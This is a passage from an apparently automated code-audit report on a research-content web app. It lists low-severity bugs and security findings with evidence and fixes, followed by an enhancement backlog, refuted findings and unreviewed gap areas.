/rss/blog.xml emits <enclosure url="..."> from post.imageUrl verbatim. Blog images are commonly stored as relative paths (e.g. /uploads/...), producing invalid enclosure URLs that feed readers and Google's feed parser reject; the sitemap code path correctly wraps the same field with toAbsoluteUrl, so this is an inconsistency. The hardcoded type="image/jpeg" is also wrong for png/webp images.

Evidence: `<enclosure url="${escapeXml(post.imageUrl)}" type="image/jpeg" length="0" /> (no toAbsoluteUrl)`

**Fix:** Wrap post.imageUrl with toAbsoluteUrl(imageUrl, SITE_URL) as the sitemap generators do, and derive the MIME type from the file extension.

### Shopify webhook HMAC check throws on wrong-length signature, acknowledged as 200

`server/routes/shopify-webhook-routes.ts:55` · low · effort: small · auditor: routes-utils

verifyShopifyWebhook calls crypto.timingSafeEqual on buffers of unchecked length; a signature header of any length other than 44 chars throws RangeError. The customer-created handler's catch then responds 200 {status:"error","Internal error"} instead of 401, so malformed-signature requests are acknowledged as delivered to Shopify (no retry) and misreported in logs as internal errors rather than auth failures. app.ts shopifyProxyAuth (line 389) length-checks first — this one doesn't.

Evidence: `return crypto.timingSafeEqual(
    Buffer.from(computed),
    Buffer.from(hmacHeader),
  );`

**Fix:** Guard with a length comparison before timingSafeEqual (return false on mismatch), mirroring shopifyProxyAuth in app.ts.

### Admin trends-dashboard data (alerts, internal search queries) served on public endpoints

`server/routes/trends-routes.ts:428` · low · effort: small · auditor: security-routes

GET /api/trends/alerts (428) and /api/trends/search-queries (510) require no auth, but their only consumer is client/src/pages/admin/TrendsAnalysisPage.tsx (via TrendsDashboard.tsx:167-182). They expose internal monitoring alerts and site-search analytics to anonymous callers. Likewise GET /api/blogs/stats/dashboard (blog-routes.ts:17) publicly reports internal draft/published counts. Mutations on these routers are correctly requireAdmin.

Evidence: `router.get("/alerts", async (req, res) => { — no guard; client caller is pages/admin/TrendsAnalysisPage`

**Fix:** Add isAdminOrEditor to /api/trends/alerts, /api/trends/search-queries, and /api/blogs/stats/dashboard, matching the admin-only pages that consume them.

### regenerate-content always exits 0, masking fatal mid-run failures

`server/scripts/regenerate-content.ts:416` · low · effort: small · auditor: gap

The main try/catch logs 'FATAL ERROR' but falls through to `process.exit(0)` unconditionally. A run that dies in phase 1 (e.g., DB disconnect, missing ANTHROPIC_API_KEY mid-run) reports success to railway run/CI and any wrapping automation, so the operator believes all phases completed and content silently stays half-regenerated.

Evidence: `} catch (err: any) { log(✗ FATAL ERROR: ${err.message}); ... } followed by unconditional process.exit(0);`

**Fix:** Track a failed flag in the catch block and exit(1) when set; also propagate per-phase error counts into the exit code.

### No aggregate spend tracking; usage logs unattributed on highest-volume paths

`server/services/ai-provider.ts:195` · low · effort: medium · auditor: ai-cost

The only spend record is a per-request logger.info("Anthropic usage") with token counts and an optional caller tag. The caller tag is omitted at every route-level call site — including chat-routes (which app.ts:572 labels 'the #1 API cost driver'), blog-routes, multi-format-generator, and blog-generator-enhanced — so logs cannot attribute spend by feature. Nothing computes dollar cost, aggregates daily totals, exports a metric to Sentry, or enforces a spend budget; runaway spend would only surface on the Anthropic invoice.

Evidence: `logger.info("Anthropic usage", "AIProvider", { model, ...(caller ? { caller } : {}), inputTokens, outputTokens });`

**Fix:** Make caller required (or default it from a stack hint), add per-model cost multiplication and an in-process daily counter exposed on /healthz or as a Sentry metric, and pass caller at chat/blog/multi-format call sites.

### findImpactedContent matches blogs on articleType = study.category, which can never be true

`server/services/auto-update-detector.ts:136` · low · effort: small · auditor: services-a-e

Related-blog lookup ORs `blogArticles.articleType = study.category`. articleType values are content types (science_explainer, faq, ...) while study.category is a body/topic (brain, heart, ...); they never overlap, so that branch is dead and blog matching relies solely on the keywords-array overlap (itself fragile if study.keywords is null). Impacted-content detection is weaker than intended.

Evidence: `sql\${blogArticles.articleType} = ${study.category}\ OR semanticKeywords && study.keywords`

**Fix:** Match blogs by a real shared dimension (category/topic column or keyword overlap), not articleType vs category.

### comprehensive-image-system.ts is dead code (never imported)

`server/services/comprehensive-image-system.ts:1` · low · effort: small · auditor: services-a-e

No file in server/, client/, or scripts/ imports comprehensive-image-system.ts or any of its exports (ensureAllStudiesHaveOptimizedImages, getProcessingStats, etc.). ~478 lines of image-generation/optimization logic with its own writeFile-to-disk paths that duplicate the storage-util path used by the live blog/study image generators. It ships and typechecks but nothing runs it.

Evidence: `grep for 'comprehensive-image-system' across server/client/scripts returns only the file itself`

**Fix:** Delete the file, or wire it into an admin route if the batch WebP-optimization flow is still wanted.

### content-generator.ts (ContentGenerator/contentGenerator) is dead code

`server/services/content-generator.ts:150` · low · effort: small · auditor: services-a-e

The ContentGenerator singleton and its generateBlogPost method are never imported anywhere. It duplicates blog-generation logic but with different behavior — it hardcodes external echowater.com links via injectLinks and writes articleType 'blog_post' — diverging from the live blog-generator-enhanced pipeline. Keeping it risks someone wiring up the wrong generator.

Evidence: `grep for 'contentGenerator|ContentGenerator|generateBlogPost' outside the file returns nothing`

**Fix:** Delete content-generator.ts, or fold any wanted behavior (external product links) into the canonical blog-generator-enhanced pipeline.

### Two divergent Europe PMC clients coexist; both are live with different behavior

`server/services/europepmc-api-fixed.ts:8` · low · effort: medium · auditor: services-a-e

europepmc-api-fixed.ts and europepmc-api.ts both export searchEuropePMC with different query building (fixed uses raw query + axios; the other uses field-scoped query + externalApi wrapper) and different result shapes. research-unified-routes and keyword-monitor-service import the 'fixed' one; scraper/discovery/europepmc-routes import the other. Divergent shapes invite subtle consumer bugs.

Evidence: `europepmc-api-fixed.ts l.8 export async function searchEuropePMC (raw axios); europepmc-api.ts l.11 same name, field-scoped query`

**Fix:** Consolidate to a single Europe PMC module with one search shape; delete the redundant file and repoint importers.

### GA4 search-terms report failures swallowed — sync reports success on auth/quota errors

`server/services/ga4-service.ts:333` · low · effort: small · auditor: services-g-r

fetchSearchTerms appends `.catch(() => ({ rows: [] }))` to the entire runReport call, so any failure — expired token, quota exhaustion, API outage, malformed request — is indistinguishable from 'property has no site search'. The sync run is then marked status 'success' with zero search-term rows, and the ga4_search_terms dataset can silently stop advancing while System Health shows green.

Evidence: `}).catch(() => ({ rows: [] as any[] }));`

**Fix:** Catch only the expected no-data case (or inspect the error status): rethrow 401/403/429/5xx so syncGa4 records a failed run, and log the swallowed error at warn level otherwise.

### Image backfill retries the same permanently-failing rows every cycle with no backoff or exclusion

`server/services/image-backfill.ts:160` · low · effort: medium · auditor: services-g-r

runImageBackfillBatch selects candidates purely by `imageUrl IS NULL` ordered viewCount DESC. A row that persistently fails generation (content-policy rejection, malformed title, provider 400) keeps its NULL imageUrl and is re-selected at the head of every 30-minute batch, occupying the 5-per-cycle slots indefinitely — the backlog behind it never drains and each cycle burns paid xAI/OpenAI attempts (including the failover double-call).

Evidence: `.where(isNull(studies.imageUrl))
      .orderBy(sql${studies.viewCount} DESC NULLS LAST, ${studies.id} ASC)`

**Fix:** Record failures (e.g. image_backfill_attempts count or lastImageAttemptAt column) and exclude or deprioritize rows above N attempts / within a cooldown window from the candidate query.

### [known] recommendation.ts is an unused duplicate of recommendation-engine.ts, with its own broken IN-clauses

`server/services/recommendation.ts:93` · low · effort: small · auditor: services-g-r

Nothing imports recommendation.ts (only server/controllers/studies-controller.ts uses recommendation-engine.ts). The dead module carries the same single-param IN bug — `category IN (${prefs.categories.join(",")})` binds 'a,b' as one string, and `studyId IN (${viewedStudyIds.join(",")})` would int-cast-error — so any future caller inherits broken/erroring queries. Same is true of the also-unimported media-generator.ts, which sends xAI-rejected params (size/response_format) and expects `url` where xAI returns b64_json.

Evidence: `sql${studies.category} IN (${preferences.categories.join(",")})`

**Fix:** Delete server/services/recommendation.ts (and server/services/media-generator.ts) or fold any needed helpers into recommendation-engine.ts / image-generator.ts, which already handle provider quirks correctly.

### Sentry initialized twice with divergent configs, and errorReportingMiddleware's request tags are a no-op

`server/utils/error-reporting.ts:49` · low · effort: small · auditor: reliability-ops

In production with SENTRY_DSN set, Sentry.init runs twice: sentry.ts:11 (tracesSampleRate 0.3, sampleRate 1.0, one beforeSend) and error-reporting.ts:49 via async dynamic import (tracesSampleRate 0.1, different beforeSend, sendDefaultPii). The second init replaces the first client, so effective sampling/scrubbing depends on an import race and the sentry.ts settings silently lose. Separately, errorReportingMiddleware (lines 160-169) sets requestId/user tags inside withScope, whose scope is popped when the callback returns — the tags never attach to any event.

Evidence: `Sentry.init({ dsn, ... tracesSampleRate: 0.1, ... }) // second init; sentry.ts already ran Sentry.init with tracesSampleRate: 0.3`

**Fix:** Keep a single init (sentry.ts); have error-reporting.ts reuse that client instead of re-initing. Replace the middleware's withScope with Sentry.getIsolationScope()/getCurrentScope() tag-setting so request context actually persists onto events.

### logger.error strips stack traces in production — Railway logs get message-only errors

`server/utils/logger.ts:68` · low · effort: small · auditor: reliability-ops

logger.error only includes the stack when NOT in production (`!isProduction && error instanceof Error ? error.stack : undefined`). Since most background-job failures reach only logger.error (see the Sentry dead-code finding), production job failures leave a single-line message with no stack in Railway logs — often useless for AI-pipeline errors whose messages are generic ("Request failed with status code 500"). Dev, where stacks are least needed, is the only place they're printed.

Evidence: `stack: !isProduction && error instanceof Error ? error.stack : undefined,`

**Fix:** Include error.stack unconditionally (JSON-structured logs handle multi-line strings fine), optionally truncated to the first ~10 frames to keep log lines bounded.

### shared/schema-updates.ts is dead code that runs ad-hoc ALTER TABLE per call and imports server code from shared/

`shared/schema-updates.ts:21` · low · effort: small · auditor: data-layer

updateStudyWithStandardizedSummary executes `ALTER TABLE studies ADD COLUMN IF NOT EXISTS ...` on every single study update — DDL inside a hot-path helper — and shared/ imports ../server/db, inverting the layering. No callers exist anywhere (grep across server/, client/, scripts/ finds none), and the five columns it adds are already declared in shared/schema.ts, so the file is pure hazard: any future caller silently reintroduces per-request DDL.

Evidence: `schema-updates.ts:21-28 ALTER TABLE studies ADD COLUMN IF NOT EXISTS objective TEXT, ... inside updateStudyWithStandardizedSummary; schema-updates.ts:5 import { db } from "../server/db"`

**Fix:** Delete shared/schema-updates.ts. If the text-extraction helpers are wanted later, move them into server/services/ without the embedded DDL.

### Stale zero-byte studies.db at repo root — SQLite remnant, unreferenced and safe to delete

`studies.db:1` · low · effort: small · auditor: data-layer

studies.db is a 0-byte file dated 2026-03-15, matched by the `*.db` gitignore rule, untracked, and referenced by no code (grep for studies.db/sqlite/better-sqlite across server/, shared/, scripts/, package.json, drizzle.config.ts finds nothing). It ships nowhere and holds no data — a leftover from an abandoned SQLite experiment. Related dir hygiene verified: uploads/ (830MB, legacy pre-bytea images) and products/ are gitignored+dockerignored so they add no repo or deploy weight; attached_assets/ tracks only 5 small pasted-text files (28KB).

Evidence: `-rw-r--r-- ... 0 Mar 15 21:01 studies.db; git ls-files studies.db → empty; zero code references`

**Fix:** Delete studies.db locally. Optionally prune the 830MB local uploads/study-images dir now that images are served from the stored_images bytea table.

### tsconfig excludes **/*.test.ts, so unit tests are never type-checked anywhere

`tsconfig.json:3` · low · effort: small · auditor: deps-build

tsconfig excludes "**/*.test.ts" from the only type-check pass (tsc --noEmit in CI), and vitest transpiles with esbuild without type-checking. Result: type errors in .test.ts files (stale mocks after schema/service signature changes) are invisible until a human opens the file. Inconsistently, .test.tsx files are NOT excluded, so React tests are checked but server tests are not.

Evidence: `"exclude": ["node_modules", "build", "dist", "**/*.test.ts"] — .test.tsx absent from the exclude list`

**Fix:** Drop the "**/*.test.ts" exclude (tests already don't emit under noEmit), or add a tsconfig.test.json checked by a CI step (`tsc -p tsconfig.test.json --noEmit`).

## Ranked enhancement backlog

### 1. Add HTTP compression for API JSON and static assets

_server · effort: small_

Verified: no compression middleware in server/app.ts and no compression dependency. Register compression() after helmet so search JSON, sitemaps, and SSR HTML are covered; add vite-plugin-compression plus express-static-gzip for the ~70 hashed route chunks served with maxAge 1y.

### 2. ScholarlyArticle JSON-LD on SEO study pages

_Technical SEO · effort: small_

SEOStudyPage.tsx — the site's largest page class — emits no structured data, while StudyPage.tsx already renders ScholarlyArticle via the existing JsonLd/StructuredData components. Port that block to SEOStudyPage with headline, DOI/PubMed IDs, authors, journal, datePublished, and a MedicalCondition about-node from category.

### 3. Publish the weekly digest publicly and email it via Klaviyo

_Newsletter / Content · effort: medium_

research-digest-generator.ts already produces an idempotent weekly digest, but it's admin-gated and newsletter-routes.ts subscribers never receive anything. Add public /digest and /digest/:slug routes plus a sitemap section, extend klaviyo-api.ts with createAndSendCampaign() called after generation, and an admin preview/approve step in /admin/pipeline before send.

### 4. Collapse getStudies' separate COUNT query into a window function

_database · effort: small_

Verified: study-service.ts lines 190-191 run a second count() round-trip with the full WHERE, so the FTS predicate executes twice per request. Add totalCount via count(*) OVER() to the main select (or 60s filter-keyed cache like cachedStats), keeping PaginatedResults' shape so search-controller.ts callers don't change.

### 5. Ship the missing 'Save study' UI for the existing backend

_Study database · effort: small_

Verified: user-dashboard-routes.ts implements POST /save-study/:id and GET /saved-studies (userStudyInteractions table) with zero client references. Add a bookmark button to StudyPage/SEOStudyPage and search result cards, plus a Saved tab in MyDashboardPage, gated behind the existing ProtectedRoute auth.

### 6. Streaming AI chat with clickable inline study citations

_AI chat · effort: medium_

Verified: chat-routes.ts contains no streaming — both chat endpoints buffer the full Anthropic response into one JSON blob. Convert to SSE using SDK 0.100 streaming via ai-provider.ts, stream tokens into both chat widgets, linkify [n] citation markers to study slugs from the existing sources array, and deliver relatedQuestions/productRecommendations as a final event.

### 7. GSC striking-distance keyword loop into the content factory

_SEO automation · effort: medium_

The gsc-sync job already lands Search Console query/page rows via gsc-service.ts, but nothing consumes them. Add a gsc-opportunity-service that finds keywords ranking 8-25 with impressions, routes 'update' items to content-optimization-service.ts and 'missing page' items to seo-content-factory.ts cluster briefs, surfaced as a one-click queue on /admin/keyword-monitor.

### 8. Evidence-grade badges on study pages and as a search filter

_Study database · effort: medium_

studyQualityScores is populated by the analysis pipeline but nothing user-facing shows it. Expose a normalized grade (human RCT / observational / animal / in-vitro plus sample size) via studies-router.ts, render a badge on both study page templates, and add an evidence-level facet to unified search and the SearchPage sidebar.

### 9. Add ESLint with no-floating-promises and a no-console ratchet to CI

_tooling / CI · effort: small_

Verified: no lint script exists; ci.yml runs only tsc, build, and vitest, while the server has hundreds of console.* calls despite logger.ts and live Sentry. Add typescript-eslint with typed no-floating-promises, no-console (warn/error allowed), and no-restricted-imports banning europepmc-api-fixed outside a single wrapper; ratchet via --max-warnings.

### 10. Citation-connections panel on individual study pages

_Study database · effort: small_

Verified: explorer-routes.ts serves GET /api/explorer/study-connections (fed by citation-network-builder.ts) but no study page uses it. Add a 'Connected research' section to SEOStudyPage.tsx rendering cited-by / references / same-topic cards, falling back to recommendation-engine.ts related studies when a study has no citation edges.

### 11. Persist per-caller AI token usage into an admin cost dashboard

_observability · effort: medium_

Verified: ai-provider.ts tags every call with a caller string and logs input/output tokens (line 195), but the data evaporates into Railway stdout. Add an ai_usage table, insert fire-and-forget at the existing logging spot (including the OpenAI fallback path), and expose per-caller/model/day rollups on admin-monitoring-routes.ts with a small chart panel.

### 12. Migration manifest and mount-order regression test for app.ts

_architecture / tooling · effort: small_

app.ts hand-wires 16 migration imports inline and 40+ route mounts whose ordering is load-bearing (OAuth callbacks before the /api/admin catch-all). Move the manifest to server/migrations/index.ts with a vitest asserting unique, sequential, complete registration; add a supertest freezing that GSC/GA4 OAuth callbacks respond without auth.

---

## Findings the verifiers threw out (do NOT action)

- [medium] [known] Missing POST /api/studies create route — REFUTE: Route absence confirmed (studies-controller.ts:17-56), but no caller exists: client/src never POSTs /api/studies, and creation is served via import-rout
- [medium] getStudyByIdentifier's LOWER(doi) predicate cannot use the studies_doi_idx partial index — REFUTE: Refuted: dedup-service.ts:86 creates studies_doi_idx as an expression index ON studies (LOWER(doi)) (shipped 2026-04-22, runs on every detectDuplicate),
- [low] ensureScoringColumns/ensureBlogLifecycleColumns DDL failures silently swallowed at boot — REFUTE: Refuted: ensureScoringColumns (study-scoring-service.ts:185-190) and ensureBlogLifecycleColumns (blog-lifecycle.ts:57-59) catch internally and call logg
- [medium] Consensus API results cached and transformed into published commercial content without link-back; caching/redistribution terms unverified — REFUTE: 24h cache is real (consensus-api.ts:74), but the "published without link-back" claim fails: no code publishes draft_content — /api/consensus/blog-outlin
- [high] First-party behavioral tracking ignores consent entirely, client and server side — REFUTE: Hook lacks consent checks as claimed, but it is dead code: nothing imports use-content-analytics.tsx and no client code calls /api/analytics/track-view 

## Gap areas the completeness critic surfaced

- SEO bot-detection / prerender middleware and dynamic sitemap-robots pipeline
- Operational one-off scripts wired to npm (bulk import, WordPress import, regenerate, backfill)
- Shopify app-proxy server-rendered mini-site (proxy-routes.ts, 1,517 lines) — XSS into a third-party storefront, embeds, export
- Third-party research-API terms-of-service and content-licensing compliance (republished abstracts, scraping, attribution)
- Privacy, consent enforcement, and sensitive-data handling (health-topic chat logs, trackers loaded pre-consent, retention/deletion)

